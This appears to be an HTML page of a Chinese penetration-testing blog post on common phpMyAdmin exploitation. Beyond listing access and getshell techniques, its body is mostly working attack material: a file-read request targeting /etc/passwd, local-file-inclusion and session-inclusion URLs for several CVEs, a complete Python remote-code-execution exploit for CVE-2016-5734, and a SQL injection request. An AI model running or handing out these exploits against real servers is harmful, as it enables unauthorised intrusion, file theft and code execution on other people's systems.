@@ -1,0 +1,618 @@
+<!DOCTYPE html>
+<html lang="zh-cn">
+    <head><meta charset='utf-8'>
+<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content='go!'><title>phpMyAdmin 常见利用</title>
+
+<link rel='canonical' href='https://coollllllll.github.io/p/sql-phpmyadmin/'>
+
+<link rel="stylesheet" href="/scss/style.min.css"><meta property='og:title' content='phpMyAdmin 常见利用'>
+<meta property='og:description' content='go!'>
+<meta property='og:url' content='https://coollllllll.github.io/p/sql-phpmyadmin/'>
+<meta property='og:site_name' content='cOOl &#39;s blog'>
+<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:published_time' content='2020-10-09T00:00:00&#43;00:00'/><meta property='article:modified_time' content='2020-10-09T00:00:00&#43;00:00'/><meta property='og:image' content='https://coollllllll.github.io/p/sql-phpmyadmin/pawel-czerwinski-8uZPynIu-rQ-unsplash.jpg' />
+<meta name="twitter:title" content="phpMyAdmin 常见利用">
+<meta name="twitter:description" content="go!"><meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:image" content='https://coollllllll.github.io/p/sql-phpmyadmin/pawel-czerwinski-8uZPynIu-rQ-unsplash.jpg' />
+    </head>
+    <body class="
+    article-page has-toc
+">
+    <script>
+        (function() {
+            const colorSchemeKey = 'StackColorScheme';
+            if(!localStorage.getItem(colorSchemeKey)){
+                localStorage.setItem(colorSchemeKey, "auto");
+            }
+        })();
+    </script><script>
+    (function() {
+        const colorSchemeKey = 'StackColorScheme';
+        const colorSchemeItem = localStorage.getItem(colorSchemeKey);
+        const supportDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches === true;
+
+        if (colorSchemeItem == 'dark' || colorSchemeItem === 'auto' && supportDarkMode) {
+            
+
+            document.documentElement.dataset.scheme = 'dark';
+        } else {
+            document.documentElement.dataset.scheme = 'light';
+        }
+    })();
+</script>
+<div class="container main-container flex 
+    
+        extended
+    
+">
+    
+        <div id="article-toolbar">
+            <a href="/" class="back-home">
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-chevron-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <polyline points="15 6 9 12 15 18" />
+</svg>
+
+
+
+                <span>返回</span>
+            </a>
+        </div>
+    
+<main class="main full-width">
+    <article class="has-image main-article">
+    <header class="article-header">
+        <div class="article-image">
+            <a href="/p/sql-phpmyadmin/">
+                <img src="/p/sql-phpmyadmin/pawel-czerwinski-8uZPynIu-rQ-unsplash_hud7e36f7e20e71be184458283bdae4646_55974_800x0_resize_q75_box.jpg"
+                        srcset="/p/sql-phpmyadmin/pawel-czerwinski-8uZPynIu-rQ-unsplash_hud7e36f7e20e71be184458283bdae4646_55974_800x0_resize_q75_box.jpg 800w, /p/sql-phpmyadmin/pawel-czerwinski-8uZPynIu-rQ-unsplash_hud7e36f7e20e71be184458283bdae4646_55974_1600x0_resize_q75_box.jpg 1600w"
+                        width="800" 
+                        height="534" 
+                        loading="lazy"
+                        alt="Featured image of post phpMyAdmin 常见利用" />
+                
+            </a>
+        </div>
+    
+
+    <div class="article-details">
+    
+    <header class="article-category">
+        
+            <a href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" style="background-color: #2a9d8f; color: #fff;">
+                渗透测试
+            </a>
+        
+    </header>
+    
+
+    <h2 class="article-title">
+        <a href="/p/sql-phpmyadmin/">phpMyAdmin 常见利用</a>
+    </h2>
+
+    
+    <h3 class="article-subtitle">
+        go!
+    </h3>
+    
+
+    
+    <footer class="article-time">
+        
+            <div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <path d="M11.795 21h-6.795a2 2 0 0 1 -2 -2v-12a2 2 0 0 1 2 -2h12a2 2 0 0 1 2 2v4" />
+  <circle cx="18" cy="18" r="4" />
+  <path d="M15 3v4" />
+  <path d="M7 3v4" />
+  <path d="M3 11h16" />
+  <path d="M18 16.496v1.504l1 1" />
+</svg>
+                <time class="article-time--published">Oct 09, 2020</time>
+            </div>
+        
+
+        
+            <div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="12" r="9" />
+  <polyline points="12 7 12 12 15 15" />
+</svg>
+
+
+
+                <time class="article-time--reading">
+                    阅读时长: 3 分钟
+                </time>
+            </div>
+        
+    </footer>
+    
+</div>
+</header>
+
+    <section class="article-content">
+    <h1 id="phpmyadmin常见利用">phpMyAdmin常见利用</h1>
+<h2 id="获取版本信息">获取版本信息</h2>
+<p>一般在根目录后加入：</p>
+<pre tabindex="0"><code>README
+ChangeLog
+doc/html/index.html
+Change
+changelog.php
+readme.php
+Documetation.html
+Documetation.txt
+translators.html
+</code></pre><h2 id="phpmyadmin权限">phpMyAdmin权限</h2>
+<ul>
+<li>SQL注入获取账号密码</li>
+<li>暴破用户名密码</li>
+</ul>
+<h2 id="获取网站绝对路径">获取网站绝对路径</h2>
+<ul>
+<li>phpinfo()</li>
+<li>利用报错页面</li>
+<li><code>@@datadir</code>、<code>@@basedir</code>根据数据库相关的绝对路径，猜测网站绝对路径</li>
+<li>使用load_file()函数读取一些默认配置文件去寻找路径，例如PHP配置文件、Apache/nginx配置文件等</li>
+</ul>
+<h2 id="利用">利用</h2>
+<ul>
+<li>写一句话getshell</li>
+<li>通过日志getshell</li>
+<li>UDF提权</li>
+<li>MOF提权</li>
+</ul>
+<p>详情参见<code>MySQL提权相关、SQL注入相关</code>。</p>
+<h2 id="其他漏洞">其他漏洞</h2>
+<h3 id="wooyun-2016-199433">WooYun-2016-199433</h3>
+<p>任意文件读取</p>
+<p>phpMyAdmin2.x</p>
+<p><strong>POC：</strong></p>
+<pre tabindex="0"><code>POST /scripts/setup.php HTTP/1.1 
+Host: your-ip:8080
+Accept-Encoding: gzip, deflate Accept: */*
+Accept-Language: en
+User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trid ent/5.0)
+Connection: close
+Content-Type: application/x-www-form-urlencoded Content-Length: 80
+
+action=test&amp;configuration=O:10:&quot;PMA_Config&quot;:1:{s:6:&quot;source&quot;,s:11:&quot;/etc/passwd&quot;;}
+</code></pre><h3 id="cve-2014-8959">CVE-2014-8959</h3>
+<p>本地文件包含</p>
+<p>phpMyAdmin 4.0.1&ndash;4.2.12</p>
+<p>PHP version &lt; 5.3.4</p>
+<p><strong>POC：</strong></p>
+<pre tabindex="0"><code>/gis_data_editor.php?token=2941949d3768c57b4342d94ace606e91&amp;gis_data[gis_type]=/../../../../phpinfo.txt%00  
+
+# 注意替换token值
+</code></pre><h3 id="cve-2016-5734">CVE-2016-5734</h3>
+<p>后台RCE</p>
+<p>PhpMyAdmin：4.0.10.16 之前的4.0.x版本；4.4.15.7 之前的 4.4.x版本；4.6.3之前的 4.6.x版本</p>
+<p>PHP version： 4.3.0-5.4.6</p>
+<p><strong>POC：</strong></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="ch">#!/usr/bin/env python</span>
+
+<span class="s2">&#34;&#34;&#34;cve-2016-5734.py: PhpMyAdmin 4.3.0 - 4.6.2 authorized user RCE exploit
+</span><span class="s2">Details: Working only at PHP 4.3.0-5.4.6 versions, because of regex break with null byte fixed in PHP 5.4.7.
+</span><span class="s2">CVE: CVE-2016-5734
+</span><span class="s2">Author: https://twitter.com/iamsecurity
+</span><span class="s2">run: ./cve-2016-5734.py -u root --pwd=&#34;&#34; http://localhost/pma -c &#34;system(&#39;ls -lua&#39;);&#34;
+</span><span class="s2">&#34;&#34;&#34;</span>
+
+<span class="kn">import</span> <span class="nn">requests</span>
+<span class="kn">import</span> <span class="nn">argparse</span>
+<span class="kn">import</span> <span class="nn">sys</span>
+
+<span class="n">__author__</span> <span class="o">=</span> <span class="s2">&#34;@iamsecurity&#34;</span>
+
+<span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s1">&#39;__main__&#39;</span><span class="p">:</span>
+    <span class="n">parser</span> <span class="o">=</span> <span class="n">argparse</span><span class="o">.</span><span class="n">ArgumentParser</span><span class="p">()</span>
+    <span class="n">parser</span><span class="o">.</span><span class="n">add_argument</span><span class="p">(</span><span class="s2">&#34;url&#34;</span><span class="p">,</span> <span class="nb">type</span><span class="o">=</span><span class="nb">str</span><span class="p">,</span> <span class="n">help</span><span class="o">=</span><span class="s2">&#34;URL with path to PMA&#34;</span><span class="p">)</span>
+    <span class="n">parser</span><span class="o">.</span><span class="n">add_argument</span><span class="p">(</span><span class="s2">&#34;-c&#34;</span><span class="p">,</span> <span class="s2">&#34;--cmd&#34;</span><span class="p">,</span> <span class="nb">type</span><span class="o">=</span><span class="nb">str</span><span class="p">,</span> <span class="n">help</span><span class="o">=</span><span class="s2">&#34;PHP command(s) to eval()&#34;</span><span class="p">)</span>
+    <span class="n">parser</span><span class="o">.</span><span class="n">add_argument</span><span class="p">(</span><span class="s2">&#34;-u&#34;</span><span class="p">,</span> <span class="s2">&#34;--user&#34;</span><span class="p">,</span> <span class="n">required</span><span class="o">=</span><span class="kc">True</span><span class="p">,</span> <span class="nb">type</span><span class="o">=</span><span class="nb">str</span><span class="p">,</span> <span class="n">help</span><span class="o">=</span><span class="s2">&#34;Valid PMA user&#34;</span><span class="p">)</span>
+    <span class="n">parser</span><span class="o">.</span><span class="n">add_argument</span><span class="p">(</span><span class="s2">&#34;-p&#34;</span><span class="p">,</span> <span class="s2">&#34;--pwd&#34;</span><span class="p">,</span> <span class="n">required</span><span class="o">=</span><span class="kc">True</span><span class="p">,</span> <span class="nb">type</span><span class="o">=</span><span class="nb">str</span><span class="p">,</span> <span class="n">help</span><span class="o">=</span><span class="s2">&#34;Password for valid PMA user&#34;</span><span class="p">)</span>
+    <span class="n">parser</span><span class="o">.</span><span class="n">add_argument</span><span class="p">(</span><span class="s2">&#34;-d&#34;</span><span class="p">,</span> <span class="s2">&#34;--dbs&#34;</span><span class="p">,</span> <span class="nb">type</span><span class="o">=</span><span class="nb">str</span><span class="p">,</span> <span class="n">help</span><span class="o">=</span><span class="s2">&#34;Existing database at a server&#34;</span><span class="p">)</span>
+    <span class="n">parser</span><span class="o">.</span><span class="n">add_argument</span><span class="p">(</span><span class="s2">&#34;-T&#34;</span><span class="p">,</span> <span class="s2">&#34;--table&#34;</span><span class="p">,</span> <span class="nb">type</span><span class="o">=</span><span class="nb">str</span><span class="p">,</span> <span class="n">help</span><span class="o">=</span><span class="s2">&#34;Custom table name for exploit.&#34;</span><span class="p">)</span>
+    <span class="n">arguments</span> <span class="o">=</span> <span class="n">parser</span><span class="o">.</span><span class="n">parse_args</span><span class="p">()</span>
+    <span class="n">url_to_pma</span> <span class="o">=</span> <span class="n">arguments</span><span class="o">.</span><span class="n">url</span>
+    <span class="n">uname</span> <span class="o">=</span> <span class="n">arguments</span><span class="o">.</span><span class="n">user</span>
+    <span class="n">upass</span> <span class="o">=</span> <span class="n">arguments</span><span class="o">.</span><span class="n">pwd</span>
+    <span class="k">if</span> <span class="n">arguments</span><span class="o">.</span><span class="n">dbs</span><span class="p">:</span>
+        <span class="n">db</span> <span class="o">=</span> <span class="n">arguments</span><span class="o">.</span><span class="n">dbs</span>
+    <span class="k">else</span><span class="p">:</span>
+        <span class="n">db</span> <span class="o">=</span> <span class="s2">&#34;test&#34;</span>
+    <span class="n">token</span> <span class="o">=</span> <span class="kc">False</span>
+    <span class="n">custom_table</span> <span class="o">=</span> <span class="kc">False</span>
+    <span class="k">if</span> <span class="n">arguments</span><span class="o">.</span><span class="n">table</span><span class="p">:</span>
+        <span class="n">custom_table</span> <span class="o">=</span> <span class="kc">True</span>
+        <span class="n">table</span> <span class="o">=</span> <span class="n">arguments</span><span class="o">.</span><span class="n">table</span>
+    <span class="k">else</span><span class="p">:</span>
+        <span class="n">table</span> <span class="o">=</span> <span class="s2">&#34;prgpwn&#34;</span>
+    <span class="k">if</span> <span class="n">arguments</span><span class="o">.</span><span class="n">cmd</span><span class="p">:</span>
+        <span class="n">payload</span> <span class="o">=</span> <span class="n">arguments</span><span class="o">.</span><span class="n">cmd</span>
+    <span class="k">else</span><span class="p">:</span>
+        <span class="n">payload</span> <span class="o">=</span> <span class="s2">&#34;system(&#39;uname -a&#39;);&#34;</span>
+
+    <span class="n">size</span> <span class="o">=</span> <span class="mi">32</span>
+    <span class="n">s</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">Session</span><span class="p">()</span>
+    <span class="c1"># you can manually add proxy support it&#39;s very simple ;)</span>
+    <span class="c1"># s.proxies = {&#39;http&#39;: &#34;127.0.0.1:8080&#34;, &#39;https&#39;: &#34;127.0.0.1:8080&#34;}</span>
+    <span class="n">s</span><span class="o">.</span><span class="n">verify</span> <span class="o">=</span> <span class="kc">False</span>
+    <span class="n">sql</span> <span class="o">=</span> <span class="s1">&#39;&#39;&#39;CREATE TABLE `</span><span class="si">{0}</span><span class="s1">` (
+</span><span class="s1">      `first` varchar(10) CHARACTER SET utf8 NOT NULL
+</span><span class="s1">    ) ENGINE=InnoDB DEFAULT CHARSET=latin1;
+</span><span class="s1">    INSERT INTO `</span><span class="si">{0}</span><span class="s1">` (`first`) VALUES (UNHEX(&#39;302F6500&#39;));
+</span><span class="s1">    &#39;&#39;&#39;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">table</span><span class="p">)</span>
+
+    <span class="c1"># get_token</span>
+    <span class="n">resp</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">url_to_pma</span> <span class="o">+</span> <span class="s2">&#34;/?lang=en&#34;</span><span class="p">,</span> <span class="nb">dict</span><span class="p">(</span>
+        <span class="n">pma_username</span><span class="o">=</span><span class="n">uname</span><span class="p">,</span>
+        <span class="n">pma_password</span><span class="o">=</span><span class="n">upass</span>
+    <span class="p">))</span>
+    <span class="k">if</span> <span class="n">resp</span><span class="o">.</span><span class="n">status_code</span> <span class="ow">is</span> <span class="mi">200</span><span class="p">:</span>
+        <span class="n">token_place</span> <span class="o">=</span> <span class="n">resp</span><span class="o">.</span><span class="n">text</span><span class="o">.</span><span class="n">find</span><span class="p">(</span><span class="s2">&#34;token=&#34;</span><span class="p">)</span> <span class="o">+</span> <span class="mi">6</span>
+        <span class="n">token</span> <span class="o">=</span> <span class="n">resp</span><span class="o">.</span><span class="n">text</span><span class="p">[</span><span class="n">token_place</span><span class="p">:</span><span class="n">token_place</span> <span class="o">+</span> <span class="mi">32</span><span class="p">]</span>
+    <span class="k">if</span> <span class="n">token</span> <span class="ow">is</span> <span class="kc">False</span><span class="p">:</span>
+        <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;Cannot get valid authorization token.&#34;</span><span class="p">)</span>
+        <span class="n">sys</span><span class="o">.</span><span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+
+    <span class="k">if</span> <span class="n">custom_table</span> <span class="ow">is</span> <span class="kc">False</span><span class="p">:</span>
+        <span class="n">data</span> <span class="o">=</span> <span class="p">{</span>
+            <span class="s2">&#34;is_js_confirmed&#34;</span><span class="p">:</span> <span class="s2">&#34;0&#34;</span><span class="p">,</span>
+            <span class="s2">&#34;db&#34;</span><span class="p">:</span> <span class="n">db</span><span class="p">,</span>
+            <span class="s2">&#34;token&#34;</span><span class="p">:</span> <span class="n">token</span><span class="p">,</span>
+            <span class="s2">&#34;pos&#34;</span><span class="p">:</span> <span class="s2">&#34;0&#34;</span><span class="p">,</span>
+            <span class="s2">&#34;sql_query&#34;</span><span class="p">:</span> <span class="n">sql</span><span class="p">,</span>
+            <span class="s2">&#34;sql_delimiter&#34;</span><span class="p">:</span> <span class="s2">&#34;;&#34;</span><span class="p">,</span>
+            <span class="s2">&#34;show_query&#34;</span><span class="p">:</span> <span class="s2">&#34;0&#34;</span><span class="p">,</span>
+            <span class="s2">&#34;fk_checks&#34;</span><span class="p">:</span> <span class="s2">&#34;0&#34;</span><span class="p">,</span>
+            <span class="s2">&#34;SQL&#34;</span><span class="p">:</span> <span class="s2">&#34;Go&#34;</span><span class="p">,</span>
+            <span class="s2">&#34;ajax_request&#34;</span><span class="p">:</span> <span class="s2">&#34;true&#34;</span><span class="p">,</span>
+            <span class="s2">&#34;ajax_page_request&#34;</span><span class="p">:</span> <span class="s2">&#34;true&#34;</span><span class="p">,</span>
+        <span class="p">}</span>
+        <span class="n">resp</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">url_to_pma</span> <span class="o">+</span> <span class="s2">&#34;/import.php&#34;</span><span class="p">,</span> <span class="n">data</span><span class="p">,</span> <span class="n">cookies</span><span class="o">=</span><span class="n">requests</span><span class="o">.</span><span class="n">utils</span><span class="o">.</span><span class="n">dict_from_cookiejar</span><span class="p">(</span><span class="n">s</span><span class="o">.</span><span class="n">cookies</span><span class="p">))</span>
+        <span class="k">if</span> <span class="n">resp</span><span class="o">.</span><span class="n">status_code</span> <span class="o">==</span> <span class="mi">200</span><span class="p">:</span>
+            <span class="k">if</span> <span class="s2">&#34;success&#34;</span> <span class="ow">in</span> <span class="n">resp</span><span class="o">.</span><span class="n">json</span><span class="p">():</span>
+                <span class="k">if</span> <span class="n">resp</span><span class="o">.</span><span class="n">json</span><span class="p">()[</span><span class="s2">&#34;success&#34;</span><span class="p">]</span> <span class="ow">is</span> <span class="kc">False</span><span class="p">:</span>
+                    <span class="n">first</span> <span class="o">=</span> <span class="n">resp</span><span class="o">.</span><span class="n">json</span><span class="p">()[</span><span class="s2">&#34;error&#34;</span><span class="p">][</span><span class="n">resp</span><span class="o">.</span><span class="n">json</span><span class="p">()[</span><span class="s2">&#34;error&#34;</span><span class="p">]</span><span class="o">.</span><span class="n">find</span><span class="p">(</span><span class="s2">&#34;&lt;code&gt;&#34;</span><span class="p">)</span><span class="o">+</span><span class="mi">6</span><span class="p">:]</span>
+                    <span class="n">error</span> <span class="o">=</span> <span class="n">first</span><span class="p">[:</span><span class="n">first</span><span class="o">.</span><span class="n">find</span><span class="p">(</span><span class="s2">&#34;&lt;/code&gt;&#34;</span><span class="p">)]</span>
+                    <span class="k">if</span> <span class="s2">&#34;already exists&#34;</span> <span class="ow">in</span> <span class="n">error</span><span class="p">:</span>
+                        <span class="nb">print</span><span class="p">(</span><span class="n">error</span><span class="p">)</span>
+                    <span class="k">else</span><span class="p">:</span>
+                        <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;ERROR: &#34;</span> <span class="o">+</span> <span class="n">error</span><span class="p">)</span>
+                        <span class="n">sys</span><span class="o">.</span><span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+    <span class="c1"># build exploit</span>
+    <span class="n">exploit</span> <span class="o">=</span> <span class="p">{</span>
+        <span class="s2">&#34;db&#34;</span><span class="p">:</span> <span class="n">db</span><span class="p">,</span>
+        <span class="s2">&#34;table&#34;</span><span class="p">:</span> <span class="n">table</span><span class="p">,</span>
+        <span class="s2">&#34;token&#34;</span><span class="p">:</span> <span class="n">token</span><span class="p">,</span>
+        <span class="s2">&#34;goto&#34;</span><span class="p">:</span> <span class="s2">&#34;sql.php&#34;</span><span class="p">,</span>
+        <span class="s2">&#34;find&#34;</span><span class="p">:</span> <span class="s2">&#34;0/e</span><span class="se">\0</span><span class="s2">&#34;</span><span class="p">,</span>
+        <span class="s2">&#34;replaceWith&#34;</span><span class="p">:</span> <span class="n">payload</span><span class="p">,</span>
+        <span class="s2">&#34;columnIndex&#34;</span><span class="p">:</span> <span class="s2">&#34;0&#34;</span><span class="p">,</span>
+        <span class="s2">&#34;useRegex&#34;</span><span class="p">:</span> <span class="s2">&#34;on&#34;</span><span class="p">,</span>
+        <span class="s2">&#34;submit&#34;</span><span class="p">:</span> <span class="s2">&#34;Go&#34;</span><span class="p">,</span>
+        <span class="s2">&#34;ajax_request&#34;</span><span class="p">:</span> <span class="s2">&#34;true&#34;</span>
+    <span class="p">}</span>
+    <span class="n">resp</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">post</span><span class="p">(</span>
+        <span class="n">url_to_pma</span> <span class="o">+</span> <span class="s2">&#34;/tbl_find_replace.php&#34;</span><span class="p">,</span> <span class="n">exploit</span><span class="p">,</span> <span class="n">cookies</span><span class="o">=</span><span class="n">requests</span><span class="o">.</span><span class="n">utils</span><span class="o">.</span><span class="n">dict_from_cookiejar</span><span class="p">(</span><span class="n">s</span><span class="o">.</span><span class="n">cookies</span><span class="p">)</span>
+    <span class="p">)</span>
+    <span class="k">if</span> <span class="n">resp</span><span class="o">.</span><span class="n">status_code</span> <span class="o">==</span> <span class="mi">200</span><span class="p">:</span>
+        <span class="n">result</span> <span class="o">=</span> <span class="n">resp</span><span class="o">.</span><span class="n">json</span><span class="p">()[</span><span class="s2">&#34;message&#34;</span><span class="p">][</span><span class="n">resp</span><span class="o">.</span><span class="n">json</span><span class="p">()[</span><span class="s2">&#34;message&#34;</span><span class="p">]</span><span class="o">.</span><span class="n">find</span><span class="p">(</span><span class="s2">&#34;&lt;/a&gt;&#34;</span><span class="p">)</span><span class="o">+</span><span class="mi">8</span><span class="p">:]</span>
+        <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">result</span><span class="p">):</span>
+            <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;result: &#34;</span> <span class="o">+</span> <span class="n">result</span><span class="p">)</span>
+            <span class="n">sys</span><span class="o">.</span><span class="n">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+        <span class="nb">print</span><span class="p">(</span>
+            <span class="s2">&#34;Exploit failed!</span><span class="se">\n</span><span class="s2">&#34;</span>
+            <span class="s2">&#34;Try to manually set exploit parameters like --table, --database and --token.</span><span class="se">\n</span><span class="s2">&#34;</span>
+            <span class="s2">&#34;Remember that servers with PHP version greater than 5.4.6&#34;</span>
+            <span class="s2">&#34; is not exploitable, because of warning about null byte in regexp&#34;</span>
+        <span class="p">)</span>
+        <span class="n">sys</span><span class="o">.</span><span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+
+</code></pre></div><h3 id="cve-2018-12613">CVE-2018-12613</h3>
+<p>后台文件包含</p>
+<p>phpMyAdmin : 4.8.0和4.8.1</p>
+<p><strong>利用：</strong></p>
+<pre tabindex="0"><code># 写session文件
+select '&lt;?php phpinfo();exit;?&gt;'
+
+http://10.1.1.10/index.php?target=db_sql.php%253f/../../../../../../../../var/l ib/php/sessions/sess_*** 	// *** 为phpMyAdmin的COOKIE值
+
+
+</code></pre><h3 id="cve-2018-19968">CVE-2018-19968</h3>
+<p>任意文件包含/RCE</p>
+<p>phpMyAdmin ：4.8.0-4.8.3</p>
+<p><strong>利用：</strong></p>
+<pre tabindex="0"><code># 创建数据库，并将PHP代码写入session文件
+CREATE DATABASE foo;
+CREATE TABLE foo.bar ( baz VARCHAR(100) PRIMARY KEY );
+INSERT INTO foo.bar SELECT '&lt;?php phpinfo(); ?&gt;';
+
+# 访问如下url，在foo数据库中生成phpMyAdmin的配置表
+http://xxxx/chk_rel.php?fixall_pmadb=1&amp;db=foo
+
+# 在foo数据库中插入如下数据
+INSERT INTO pma__column_infoSELECT ‘1’, ‘foo’, ‘bar’, ‘baz’, ‘plop’,
+‘plop’, ‘plop’, ‘plop’,
+‘../../../../../../../../tmp/sess_***’,‘plop’;  // ***为phpMyAdmin的COOKIE值;需要注意session文件的位置，不同环境会有差异
+
+# 访问如下url，实现包含session文件
+http://xxxx/tbl_replace.php?db=foo&amp;table=bar&amp;where_clause=1=1&amp;fields_name[multi_edit][][]=baz&amp;clause_is_unique=1
+</code></pre><h3 id="cve-2020-0554">CVE-2020-0554</h3>
+<p>后台SQL注入</p>
+<p>phpMyAdmin 4&lt; 4.9.4</p>
+<p>phpMyAdmin 5&lt; 5.0.1</p>
+<p><strong>POC：</strong></p>
+<pre tabindex="0"><code>http://xxxx/server_privileges.php?ajax_requests=true&amp;validate_username=1&amp;username=1%27or%201=1%20--+db=&amp;token=c2064a8c5f437da931fa01de5aec6581&amp;viewing_mode=server
+
+# 执行完毕后仅知道这条语句的执行成功与否，失败的话会报错，因此后续可以利用报错注入
+</code></pre>
+</section>
+
+
+    <footer class="article-footer">
+    
+
+    
+    <section class="article-copyright">
+        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-copyright" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="12" r="9" />
+  <path d="M14.5 9a3.5 4 0 1 0 0 6" />
+</svg>
+
+
+
+        <span>Licensed under CC BY-NC-SA 4.0</span>
+    </section>
+    </footer>
+
+
+    
+</article>
+
+    <aside class="related-contents--wrapper">
+    
+    
+        <h2 class="section-title">相关文章</h2>
+        <div class="related-contents">
+            <div class="flex article-list--tile">
+                
+                    
+<article class="has-image">
+    <a href="/p/redis/">
+        
+        
+            <div class="article-image">
+                <img src="/p/redis/_hud7e36f7e20e71be184458283bdae4646_55974_23a5d351d2fc2374f952239b6e9c423a.jpg" 
+                        width="250" 
+                        height="150" 
+                        loading="lazy"
+                        alt="Featured image of post Redis 未授权利用"
+                        data-key="redis" 
+                        data-hash="md5-xRTZFpFxc6SKQuARS0aZYQ==">
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">Redis 未授权利用</h2>
+        </div>
+    </a>
+</article>
+                
+                    
+<article class="has-image">
+    <a href="/p/wifi/">
+        
+        
+            <div class="article-image">
+                <img src="/p/wifi/_hud7e36f7e20e71be184458283bdae4646_55974_23a5d351d2fc2374f952239b6e9c423a.jpg" 
+                        width="250" 
+                        height="150" 
+                        loading="lazy"
+                        alt="Featured image of post 破解WiFi密码"
+                        data-key="wifi" 
+                        data-hash="md5-xRTZFpFxc6SKQuARS0aZYQ==">
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">破解WiFi密码</h2>
+        </div>
+    </a>
+</article>
+                
+                    
+<article class="has-image">
+    <a href="/p/1/">
+        
+        
+            <div class="article-image">
+                <img src="/p/1/_hu0a3f1163de68d0b9471979ebf0ecf11e_32400_a354a9a1f5102742bceb4ec236f4ce2f.jpg" 
+                        width="250" 
+                        height="150" 
+                        loading="lazy"
+                        alt="Featured image of post Linux 提权"
+                        data-key="1" 
+                        data-hash="md5-rC&#43;UhC7sa7h6Y66uIugvQQ==">
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">Linux 提权</h2>
+        </div>
+    </a>
+</article>
+                
+            </div>
+        </div>
+    
+</aside>
+
+     
+    
+        
+    
+
+    <footer class="site-footer">
+    <section class="copyright">
+        &copy; 
+        
+            2020 - 
+        
+        2022 cOOl &#39;s blog
+    </section>
+    
+    <section class="powerby">
+        Built with <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> <br />
+        Theme <b><a href="https://github.com/CaiJimmy/hugo-theme-stack" target="_blank" rel="noopener" data-version="3.5.0">Stack</a></b> designed by <a href="https://jimmycai.com" target="_blank" rel="noopener">Jimmy</a>
+    </section>
+</footer>
+
+
+    
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+
+    
+    <div class="pswp__bg"></div>
+
+    
+    <div class="pswp__scroll-wrap">
+
+        
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+
+        
+        <div class="pswp__ui pswp__ui--hidden">
+
+            <div class="pswp__top-bar">
+
+                
+
+                <div class="pswp__counter"></div>
+
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+
+                
+                
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                        <div class="pswp__preloader__cut">
+                            <div class="pswp__preloader__donut"></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div>
+            </div>
+
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+
+        </div>
+
+    </div>
+
+</div><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js"integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo="crossorigin="anonymous"
+                defer="true"
+                >
+            </script><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js"integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU="crossorigin="anonymous"
+                defer="true"
+                >
+            </script><link 
+                rel="stylesheet" 
